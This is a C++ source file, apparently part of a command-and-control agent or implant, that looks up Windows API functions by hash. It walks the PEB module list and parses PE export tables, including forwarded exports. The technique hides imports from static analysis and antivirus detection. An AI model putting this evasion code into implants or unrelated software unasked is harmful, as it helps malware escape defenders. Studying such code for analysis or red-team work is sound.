#include "agent/core.h"
#include "utils/utils.h"


#define HASH_SEED 5381

namespace api {

	FARPROC GetProcAddressInternal( HMODULE dll, DWORD Hash, INT depth ) {
		if ( depth > 6 )
			return NULL;
		if ( dll == NULL )
			return NULL;

		uintptr_t dllAddress = ( uintptr_t ) dll;

		PIMAGE_NT_HEADERS nt = ( PIMAGE_NT_HEADERS ) ( dllAddress + ( ( PIMAGE_DOS_HEADER ) dllAddress ) ->e_lfanew);
		PIMAGE_DATA_DIRECTORY dataDir = ( PIMAGE_DATA_DIRECTORY ) &nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];
		PIMAGE_EXPORT_DIRECTORY exportDir = ( PIMAGE_EXPORT_DIRECTORY ) ( dllAddress + dataDir->VirtualAddress );


		uintptr_t exportAddressTable = dllAddress + exportDir->AddressOfFunctions;
		uintptr_t namePointerTable = dllAddress + exportDir->AddressOfNames;
		uintptr_t ordinalTable = dllAddress + exportDir->AddressOfNameOrdinals;
		uintptr_t symbolAddress = 0;
		DWORD procAddress = 0;

		DWORD counter = exportDir->NumberOfNames;
		while ( counter-- ) {
			PUCHAR cpExportedFunction = ( PUCHAR ) ( dllAddress + * ( DWORD * ) namePointerTable);
			if (api::HasherA( ( char* )cpExportedFunction ) == Hash) {
				exportAddressTable += ( * ( WORD * ) ordinalTable * sizeof ( DWORD ) );
				procAddress = * ( DWORD * )exportAddressTable;
				symbolAddress = dllAddress + procAddress;

				if ( dataDir->VirtualAddress < procAddress && procAddress < dataDir->VirtualAddress + dataDir->Size ) {
					char* symbol = ( char* ) ( symbolAddress );
					char moduleName[ 64 ] = { 0 };
					char funcName[ 64 ]   = { 0 };

					char* dot = utils::str::strchr( symbol, '.' );
					if ( dot ) {
						int index = ( int ) ( dot - symbol ) + 1;
						utils::mem::memcpy( moduleName, symbol, index );
						moduleName[ index ]     = 'd';
						moduleName[ index + 1 ] = 'l';
						moduleName[ index + 2 ] = 'l';
						moduleName[ index + 3 ] = 0;

						utils::mem::memcpy( funcName, symbol + index, utils::str::strlen ( symbol ) - index + 1);
						BOOL isApiSetDll = FALSE;
						if ( utils::str::strlen( moduleName ) > 11 && utils::str::strncmp ( moduleName, "api-ms-win-", 11 ) == 0 ) {
							isApiSetDll = TRUE;
						}
						else if ( utils::str::strlen ( moduleName ) > 7 && utils::str::strncmp ( moduleName, "ext-ms-", 7 ) == 0 ) {
							isApiSetDll = TRUE;
						}

						HMODULE hForward = kratos->apis.LoadLibraryA( moduleName );
						if ( hForward ) {
							LPVOID result = NULL;

							if ( isApiSetDll ) {
								result = ( LPVOID ) kratos->apis.GetProcAddress( hForward, funcName );
							}
							else {
								ULONG funcHash = api::HasherA( funcName );
								result = (LPVOID)api::GetProcAddressInternal( hForward, funcHash, depth + 1 );
							}

							utils::mem::memset( moduleName, 0, utils::str::strlen( moduleName ) );
							utils::mem::memset( funcName, 0, utils::str::strlen( funcName ) );

							return (FARPROC)result;
						}
						utils::mem::memset( moduleName, 0, utils::str::strlen( moduleName ) );
						utils::mem::memset( funcName, 0, utils::str::strlen( funcName ) );
					}
					break;
				}
				else {
					return ( FARPROC )symbolAddress;
				}
			}
			namePointerTable += sizeof( DWORD );
			ordinalTable += sizeof( WORD );
		}
		return NULL;
	}


	FARPROC GetProcAddress( HMODULE dll, DWORD Hash ) {
		return api::GetProcAddressInternal( dll, Hash, 0 );
	}


	HMODULE GetModule( DWORD Hash ) {
		PPEB p = utils::win::GetPeb( );
		if ( ! p || ! p->Ldr ) { return NULL; }
		PEB_LDR_DATA* Ldr = p->Ldr;
		LIST_ENTRY* modules = &Ldr->InMemoryOrderModuleList;
		LIST_ENTRY* start = modules->Flink;

		for ( LIST_ENTRY* List = start; List != modules; List = List->Flink ) {
			LDR_DATA_TABLE_ENTRY* entry = ( LDR_DATA_TABLE_ENTRY*  ) ( ( BYTE * ) List - sizeof( LIST_ENTRY ) );
			if (api::HasherW ( entry->BaseDllName.Buffer ) == Hash ) {
				return ( HMODULE )entry->DllBase;
			}
		}

		return NULL;
	}

}